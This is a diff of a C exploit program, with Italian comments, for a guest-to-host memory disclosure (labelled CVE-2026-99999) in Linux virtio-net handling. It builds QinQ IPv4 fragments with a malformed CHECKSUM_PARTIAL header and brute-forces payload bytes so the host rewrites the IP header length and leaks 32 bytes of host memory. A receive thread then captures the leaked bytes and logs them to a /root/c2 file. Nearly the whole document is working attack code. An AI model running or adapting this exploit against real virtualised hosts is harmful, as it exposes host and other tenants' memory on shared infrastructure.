@@ -1,31 +1,24 @@
-// pwnescape_read.c — Guest-side memory disclosure PoC (CVE-2026-99999)
-//
-// Root cause: l'IPv4 non valida csum_start prima di skb_checksum_help().
-// Un CHECKSUM_PARTIAL driftato (csum_start punta sull'header IP del frame
-// QinQ; la decapsulazione VLAN lato host sposta network_header) fa scrivere
-// il checksum completato SU iph[0] (version/IHL): 0x45 -> 0x4f (IHL 5 -> 15).
-// ip_do_fragment() consuma l'IHL mutato e copia 60 byte di "header" da una
-// linear head che contiene logicamente solo 28 byte: 32 byte di memoria host
-// emessi in egress come finte "IP options".
-//
-// Ambiente: guest Linux con CAP_NET_RAW, iface virtio-net con IFF_VNET_HDR
-//           (Firecracker/qemu). Host kernel PRE-fix (< 6785011f8b16).
-// Build: gcc -O2 -Wall -o pwnescape_read pwnescape_read.c
-// Usage: ./pwnescape_read <iface> <src_ip> <dst_ip> <frag_id> [csum_start] [csum_offset]
-
+/* pwnescape_all.c — CVE-2026-99999 PoC (sender + readback in un processo)
+ * gcc -O2 -Wall -pthread -o pwnescape_all pwnescape_all.c
+ * Usage (root): ./pwnescape_all <iface> <src_ip> <dst_ip> <frag_id> [csum_start] [csum_offset]
+ * Log: /root/c2/log.txt (append) */
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <errno.h>
+#include <time.h>
+#include <pthread.h>
 #include <arpa/inet.h>
 #include <net/if.h>
 #include <net/ethernet.h>
 #include <netpacket/packet.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
+#include <sys/stat.h>
 #include <linux/if_ether.h>
+#include <linux/if_packet.h>
 #include <linux/ip.h>
 #include <linux/virtio_net.h>
 #include <netinet/in.h>
@@ -33,45 +26,49 @@
 #ifndef IP_MF
 #define IP_MF 0x2000
 #endif
-
 #ifndef PACKET_VNET_HDR
 #define PACKET_VNET_HDR 15
 #endif
 
-#define IHL_FLIP_HI 0x4f    /* iph[0] dopo la write driftata: version 4, IHL 15 (60 B) */
-
-#define QINQ_HDR_LEN 22     /* eth(14) + outer 802.1ad(4) + inner 802.1Q(4) */
+#define IHL_FLIP_HI 0x4f
+#define QINQ_HDR_LEN 22
 #define IP4_HDR_LEN 20
 #define ETH_HDR_LEN 14
-#define VNET_HDR_LEN 10     /* sizeof(struct virtio_net_hdr) */
+#define VNET_HDR_LEN 10
+#define FILL_BYTE 0x41
+#define LOG_PATH "/root/c2/log.txt"
+#define RX_WINDOW_SEC 30
 
-/* ---------- checksum helpers ---------- */
+static FILE *g_log;
+static pthread_mutex_t g_log_mu = PTHREAD_MUTEX_INITIALIZER;
 
-static uint16_t iph_checksum(const uint8_t *h, int len) {
-    uint32_t s = 0;
-    for (int i = 0; i < len; i += 2)
-        s += (h[i] << 8) | h[i + 1];
-    while (s >> 16) s = (s & 0xffff) + (s >> 16);
-    return ~s & 0xffff;
+static void lg(const char *fmt, ...) {
+    va_list ap;
+    time_t t = time(NULL);
+    char ts[32];
+    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", localtime(&t));
+    pthread_mutex_lock(&g_log_mu);
+    fprintf(g_log, "[%s] ", ts);
+    va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap);
+    fputc('\n', g_log);
+    fflush(g_log);
+    pthread_mutex_unlock(&g_log_mu);
 }
 
+/* ---------- checksum helpers (invariati) ---------- */
 static uint16_t fold16(uint32_t s) {
     while (s >> 16) s = (s & 0xffff) + (s >> 16);
     return ~s & 0xffff;
 }
-
-/* Somma big-endian a granularita' 16 bit (com'e' fatta da skb_checksum) */
 static uint32_t be_sum(const uint8_t *p, int n) {
     uint32_t s = 0;
     for (int i = 0; i + 1 < n; i += 2) s += (p[i] << 8) | p[i + 1];
     if (n & 1) s += p[n - 1] << 8;
     return s;
 }
-
-/* Trova x,y (p1[0], p1[1]) tali che l'alto del checksum foldato sia 0x4f.
- * skb_checksum_help scrive il __sum16 in network order:
- *   mem[0] = fold >> 8  (= iph[0] con csum_offset=0)
- * => serve (fold & 0xff00) == 0x4f00. 65536 coppie, sempre risolvibile. */
+static uint16_t iph_checksum(const uint8_t *h, int len) {
+    return fold16(be_sum(h, len));
+}
 static int tune_payload(uint8_t *p1, uint32_t base_sum) {
     for (int x = 0; x < 256; x++)
         for (int y = 0; y < 256; y++) {
@@ -84,31 +81,26 @@ static int tune_payload(uint8_t *p1, uint32_t base_sum) {
     return -1;
 }
 
-/* ---------- socket / iface ---------- */
-
-static int open_pkt_sock(const char *ifname) {
+/* ---------- socket ---------- */
+static int open_pkt_sock(const char *ifname, int vnet) {
     int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (fd < 0) { perror("socket"); return -1; }
-    int one = 1;
-    if (setsockopt(fd, SOL_PACKET, PACKET_VNET_HDR, &one, sizeof(one)) < 0) {
-        perror("PACKET_VNET_HDR (serve IFF_VNET_HDR sul tap dell'iface)");
-        close(fd); return -1;
+    if (fd < 0) { lg("socket: %s", strerror(errno)); return -1; }
+    if (vnet) {
+        int one = 1;
+        if (setsockopt(fd, SOL_PACKET, PACKET_VNET_HDR, &one, sizeof(one)) < 0) {
+            lg("PACKET_VNET_HDR: %s (serve IFF_VNET_HDR)", strerror(errno));
+            close(fd); return -1;
+        }
     }
     struct sockaddr_ll sll;
     memset(&sll, 0, sizeof(sll));
     sll.sll_family   = AF_PACKET;
     sll.sll_protocol = htons(ETH_P_ALL);
     sll.sll_ifindex  = (int)if_nametoindex(ifname);
-    if (!sll.sll_ifindex) {
-        fprintf(stderr, "iface %s: %s\n", ifname, strerror(errno));
-        close(fd); return -1;
-    }
-    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
-        perror("bind"); close(fd); return -1;
-    }
+    if (!sll.sll_ifindex) { lg("iface %s: %s", ifname, strerror(errno)); close(fd); return -1; }
+    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) { lg("bind: %s", strerror(errno)); close(fd); return -1; }
     return fd;
 }
-
 static int iface_mtu(const char *ifname) {
     struct ifreq ifr;
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -122,49 +114,7 @@ static int iface_mtu(const char *ifname) {
     return mtu;
 }
 
-/* ---------- costruzione frame (QinQ: 802.1ad + 802.1Q + IPv4) ---------- */
-
-static void qinq_ip_header(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
-                           uint32_t saddr, uint32_t daddr, uint16_t id,
-                           uint16_t frag_off_mf, int plen) {
-    memcpy(f, dhost, 6); memcpy(f + 6, shost, 6);
-    f[12] = 0x88; f[13] = 0xa8;                              /* 802.1ad outer */
-    f[14] = 0x00; f[15] = 0x0a; f[16] = 0x81; f[17] = 0x00;  /* vid=10, 802.1Q inner */
-    f[18] = 0x00; f[19] = 0x0a; f[20] = 0x08; f[21] = 0x00;  /* vid=10, IPv4 */
-    uint8_t *ip = f + QINQ_HDR_LEN;
-    ip[0] = 0x45; ip[1] = 0x00;
-    *(uint16_t *)(ip + 2) = htons((uint16_t)(IP4_HDR_LEN + plen));
-    *(uint16_t *)(ip + 4) = htons(id);
-    *(uint16_t *)(ip + 6) = htons(frag_off_mf);
-    ip[8] = 64; ip[9] = IPPROTO_UDP;
-    memcpy(ip + 12, &saddr, 4); memcpy(ip + 16, &daddr, 4);
-    /* ip[20..] = payload, riempito dal chiamante */
-    *(uint16_t *)(ip + 10) = iph_checksum(ip, IP4_HDR_LEN);  /* costante: non copre il payload */
-}
-
-/* frag1: testa del datagramma, 8 byte di payload, MF=1, offset 0.
- * p1[0..1] sono le variabili libere del tuning del checksum. */
-static void build_frag1(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
-                        uint32_t saddr, uint32_t daddr, uint16_t id,
-                        const uint8_t *p1) {
-    qinq_ip_header(f, dhost, shost, saddr, daddr, id, IP_MF, 8);
-    memcpy(f + QINQ_HDR_LEN + IP4_HDR_LEN, p1, 8);
-}
-
-/* frammento di coda: offset in unita' da 8 byte, MF=1 tranne sull'ultimo.
- * payload fill 0x41: byte != 0x41 in egress = disclosure host. */
-static void build_tail(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
-                       uint32_t saddr, uint32_t daddr, uint16_t id,
-                       uint16_t off_units, int last, int plen) {
-    qinq_ip_header(f, dhost, shost, saddr, daddr, id,
-                   (uint16_t)(off_units | (last ? 0 : IP_MF)), plen);
-    memset(f + QINQ_HDR_LEN + IP4_HDR_LEN, 0x41, (size_t)plen);
-}
-
-/* ---------- TX con vnet header ---------- */
-
-/* NB: i campi di virtio_net_hdr sono __u16 LITTLE-ENDIAN => assegnazione
- * diretta, NESSUN htons(). */
+/* ---------- TX ---------- */
 static int send_vnet(int fd, const uint8_t *frame, size_t flen,
                      uint16_t csum_start, uint16_t csum_offset, uint8_t flags) {
     static uint8_t buf[9400];
@@ -172,15 +122,91 @@ static int send_vnet(int fd, const uint8_t *frame, size_t flen,
     if (hs + flen > sizeof(buf)) { errno = EMSGSIZE; return -1; }
     struct virtio_net_hdr *vh = (struct virtio_net_hdr *)buf;
     memset(vh, 0, hs);
-    vh->flags       = flags;
-    vh->csum_start  = csum_start;   /* host byte order == LE */
+    vh->flags = flags;
+    vh->csum_start = csum_start;   /* LE, no htons */
     vh->csum_offset = csum_offset;
     memcpy(buf + hs, frame, flen);
     return (int)send(fd, buf, hs + flen, 0);
 }
 
-/* ---------- main ---------- */
+static void qinq_ip_header(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
+                           uint32_t saddr, uint32_t daddr, uint16_t id,
+                           uint16_t frag_off_mf, int plen) {
+    memcpy(f, dhost, 6); memcpy(f + 6, shost, 6);
+    f[12] = 0x88; f[13] = 0xa8;
+    f[14] = 0x00; f[15] = 0x0a; f[16] = 0x81; f[17] = 0x00;
+    f[18] = 0x00; f[19] = 0x0a; f[20] = 0x08; f[21] = 0x00;
+    uint8_t *ip = f + QINQ_HDR_LEN;
+    ip[0] = 0x45; ip[1] = 0x00;
+    *(uint16_t *)(ip + 2) = htons((uint16_t)(IP4_HDR_LEN + plen));
+    *(uint16_t *)(ip + 4) = htons(id);
+    *(uint16_t *)(ip + 6) = htons(frag_off_mf);
+    ip[8] = 64; ip[9] = IPPROTO_UDP;
+    memcpy(ip + 12, &saddr, 4); memcpy(ip + 16, &daddr, 4);
+    *(uint16_t *)(ip + 10) = iph_checksum(ip, IP4_HDR_LEN);
+}
+static void build_frag1(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
+                        uint32_t saddr, uint32_t daddr, uint16_t id, const uint8_t *p1) {
+    qinq_ip_header(f, dhost, shost, saddr, daddr, id, IP_MF, 8);
+    memcpy(f + QINQ_HDR_LEN + IP4_HDR_LEN, p1, 8);
+}
+static void build_tail(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
+                       uint32_t saddr, uint32_t daddr, uint16_t id,
+                       uint16_t off_units, int last, int plen) {
+    qinq_ip_header(f, dhost, shost, saddr, daddr, id,
+                   (uint16_t)(off_units | (last ? 0 : IP_MF)), plen);
+    memset(f + QINQ_HDR_LEN + IP4_HDR_LEN, FILL_BYTE, (size_t)plen);
+}
 
+/* ---------- thread RX ---------- */
+static volatile int g_run = 1;
+static uint16_t g_want_id;
+static int g_seen_frag, g_seen_mutated;
+
+static void *rx_thread(void *arg) {
+    int fd = open_pkt_sock((const char *)arg, 0);   /* RX socket: no vnet hdr */
+    if (fd < 0) return NULL;
+    uint8_t buf[9500];
+    time_t t0 = time(NULL);
+    while (g_run && time(NULL) - t0 < RX_WINDOW_SEC) {
+        struct sockaddr_ll from;
+        socklen_t alen = sizeof(from);
+        ssize_t n = recvfrom(fd, buf, sizeof(buf), 0, (struct sockaddr *)&from, &alen);
+        if (n < (ssize_t)(14 + 20)) continue;
+        if (from.sll_pkttype == PACKET_OUTGOING) continue;   /* scarta il proprio TX */
+        uint8_t *ip = buf + 14;
+        uint16_t ethertype = (buf[12] << 8) | buf[13];
+        while ((ethertype == 0x8100 || ethertype == 0x88a8) && (ip - buf) + 4 <= n) {
+            ethertype = (ip[2] << 8) | ip[3];
+            ip += 4;
+        }
+        if (ethertype != 0x0800) continue;
+        if (n < (ip - buf) + 20) continue;
+        uint8_t ihl = (ip[0] & 0x0f) * 4;
+        uint16_t id = (ip[4] << 8) | ip[5];
+        if (id != g_want_id) continue;
+        g_seen_frag = 1;
+        lg("[frag rx] id=0x%04x iph[0]=0x%02x ihl=%u tot_len=%u off=0x%04x",
+           id, ip[0], ihl, (ip[2] << 8) | ip[3], (ip[6] << 8) | ip[7]);
+        if (ip[0] == IHL_FLIP_HI) {
+            g_seen_mutated = 1;
+            int opts_len = ihl - 20, leaked = 0;
+            lg("[+] IHL MUTATO (0x4f): %d byte di 'options'", opts_len);
+            char hex[1024];
+            size_t o = 0;
+            for (int i = 20; i < ihl && o < sizeof(hex) - 4; i++) {
+                if (ip[i] != FILL_BYTE) leaked++;
+                o += (size_t)snprintf(hex + o, sizeof(hex) - o, "%02x ", ip[i]);
+            }
+            lg("    options: %s", hex);
+            lg("    ==> byte options != 0x%02x (disclosure host): %d/%d", FILL_BYTE, leaked, opts_len);
+        }
+    }
+    close(fd);
+    return NULL;
+}
+
+/* ---------- main ---------- */
 int main(int argc, char **argv) {
     const char *ifname = argc > 1 ? argv[1] : "eth0";
     uint32_t saddr = inet_addr(argc > 2 ? argv[2] : "192.0.2.2");
@@ -189,82 +215,65 @@ int main(int argc, char **argv) {
     uint16_t csum_start = argc > 5 ? (uint16_t)atoi(argv[5]) : 22;
     uint16_t csum_off   = argc > 6 ? (uint16_t)atoi(argv[6]) : 0;
 
-    uint8_t dhost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x05 };  /* MAC gw (192.0.2.1, da ARP) */
-    uint8_t shost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x01 };  /* MAC eth0 (verificato) */
+    mkdir("/root/c2", 0755);
+    g_log = fopen(LOG_PATH, "a");
+    if (!g_log) { perror("fopen log"); g_log = stderr; }
+    g_want_id = id;
+
+    uint8_t dhost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x05 };
+    uint8_t shost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x01 };
     uint8_t p1[8]    = { 0xde, 0xad, 0xbe, 0xef, 0x00, 0x00, 0xde, 0xad };
 
     int mtu = iface_mtu(ifname);
-    /* limite send AF_PACKET+VNET_HDR: mtu + eth(14) + VLAN_HLEN(4); tolto il
-     * vnet hdr(10) resta il frame max; meno l'overhead QinQ+IP4 (42) il payload */
     int max_frame = mtu + ETH_HDR_LEN + 4 - VNET_HDR_LEN;
-    int plen = (max_frame - (QINQ_HDR_LEN + IP4_HDR_LEN)) & ~7;  /* multiplo di 8 */
-    if (plen < 400) {
-        fprintf(stderr, "MTU %d troppo piccolo per la geometria (serve payload >= ~400)\n", mtu);
-        return 1;
-    }
-    /* il datagramma riassemblato (20 hdr + 8 frag1 + N*plen) deve superare
-     * l'MTU egresso => l'host ri-framenta sull'output path (li' scatta il bug) */
+    int plen = (max_frame - (QINQ_HDR_LEN + IP4_HDR_LEN)) & ~7;
+    if (plen < 400) { lg("MTU %d troppo piccolo", mtu); return 1; }
     int n_tail = (mtu - 28) / plen + 1;
-
-    fprintf(stderr, "[*] iface %s mtu=%d, payload coda=%d B, %d frammenti di coda\n",
-            ifname, mtu, plen, n_tail);
+    lg("=== start iface=%s mtu=%d plen=%d n_tail=%d id=0x%04x csum_start=%u csum_off=%u",
+       ifname, mtu, plen, n_tail, id, csum_start, csum_off);
 
     static uint8_t f1[QINQ_HDR_LEN + IP4_HDR_LEN + 8];
     static uint8_t tailbuf[QINQ_HDR_LEN + IP4_HDR_LEN + 9200];
-    if (QINQ_HDR_LEN + IP4_HDR_LEN + plen > sizeof(tailbuf)) {
-        fprintf(stderr, "plen overflow (%d)\n", plen);
-        return 1;
-    }
+    if (QINQ_HDR_LEN + IP4_HDR_LEN + plen > sizeof(tailbuf)) { lg("plen overflow"); return 1; }
 
-    /* base_sum = cio' che skb_checksum_help sommera' da csum_start a fine skb:
-     *  - header IP di frag1 (20 B) cosi' come trasmesso, campo check INCLUSO
-     *    (costante: il check IP non copre i payload, resta valido dopo il tuning)
-     *  - p1[2..7] (i byte [0..1] sono le variabili libere del tuning)
-     *  - payload di ogni frammento di coda: fill 0x41 =>
-     *    be_sum = (plen/2) parole da 0x4141 */
     build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
     uint32_t base = be_sum(f1 + QINQ_HDR_LEN, IP4_HDR_LEN)
                   + be_sum(p1 + 2, 6)
                   + (uint32_t)n_tail * ((uint32_t)plen / 2) * 0x4141u;
+    if (tune_payload(p1, base) < 0) { lg("tuning fallito"); return 1; }
+    build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
 
-    if (tune_payload(p1, base) < 0) { fprintf(stderr, "tuning fallito\n"); return 1; }
-    build_frag1(f1, dhost, shost, saddr, daddr, id, p1);  /* rebuild con payload tunato */
+    /* RX thread parte PRIMA del TX */
+    pthread_t rx;
+    if (pthread_create(&rx, NULL, rx_thread, (void *)ifname) != 0) { lg("pthread_create"); return 1; }
+    usleep(200000);   /* dai tempo al RX socket di bindare */
 
-    int fd = open_pkt_sock(ifname);
-    if (fd < 0) return 1;
+    int fd = open_pkt_sock(ifname, 1);
+    if (fd < 0) { g_run = 0; pthread_join(rx, NULL); return 1; }
 
-    /* 1) frammenti di coda (senza CHECKSUM_PARTIAL) */
-    uint16_t off = 1;   /* frag1 porta 8 byte => prima coda a offset unit 1 */
+    uint16_t off = 1;
     for (int i = 0; i < n_tail; i++) {
         build_tail(tailbuf, dhost, shost, saddr, daddr, id, off, i == n_tail - 1, plen);
-        if (send_vnet(fd, tailbuf, QINQ_HDR_LEN + IP4_HDR_LEN + plen, 0, 0, 0) < 0) {
-            fprintf(stderr, "send tail %d: %s\n", i, strerror(errno));
-            close(fd);
-            return 1;
-        }
+        if (send_vnet(fd, tailbuf, QINQ_HDR_LEN + IP4_HDR_LEN + plen, 0, 0, 0) < 0)
+            lg("send tail %d: %s", i, strerror(errno));
         off = (uint16_t)(off + plen / 8);
         usleep(1000);
     }
     usleep(2000);
-
-    /* 2) testa: frag1 col vnet_hdr malevolo (CHECKSUM_PARTIAL driftato).
-     * csum_start=22 = posizione dell'header IP nel frame QinQ; dopo l'untag
-     * lato host il network_header si sposta indietro => la write di
-     * skb_checksum_help finisce su iph[0] (csum_offset=0).
-     * Se il kernel guest filtra questa geometria al send (virtio_net_hdr_to_skb),
-     * provare: ./pwnescape_read <if> <src> <dst> <id> 42 0 */
-    if (send_vnet(fd, f1, sizeof(f1), csum_start, csum_off,
-                  VIRTIO_NET_HDR_F_NEEDS_CSUM) < 0) {
-        fprintf(stderr, "send frag1: %s\n", strerror(errno));
-        close(fd);
-        return 1;
-    }
-
-    printf("[+] frag id=0x%04x: %d frammenti di coda (%d B payload ciascuno) "
-           "+ frag1 driftato (csum_start=%u, csum_offset=%u)\n"
-           "    atteso in egress host: iph[0] 0x45 -> 0x4f e 32 B di 'IP options' "
-           "non-0x41 (disclosure host)\n",
-           id, n_tail, plen, csum_start, csum_off);
+    if (send_vnet(fd, f1, sizeof(f1), csum_start, csum_off, VIRTIO_NET_HDR_F_NEEDS_CSUM) < 0)
+        lg("send frag1: %s", strerror(errno));
+    else
+        lg("[+] TX completato: %d tail + frag1 (csum_start=%u, csum_offset=%u); attendo RX %d s",
+           n_tail, csum_start, csum_off, RX_WINDOW_SEC);
     close(fd);
-    return 0;
+
+    pthread_join(rx, NULL);
+    if (g_seen_mutated)
+        lg("[+] VERDETTO: TRIGGER CONFERMATO (0x4f osservato in ingresso)");
+    else if (g_seen_frag)
+        lg("[-] VERDETTO: frammenti tornati ma drift non avvenuto (tx offload? decap VLAN? csum_start?)");
+    else
+        lg("[-] VERDETTO: nessun frammento id=0x%04x tornato (bounce/NAT assente o defrag host assente)", id);
+    fclose(g_log);
+    return g_seen_mutated ? 0 : 1;
 }
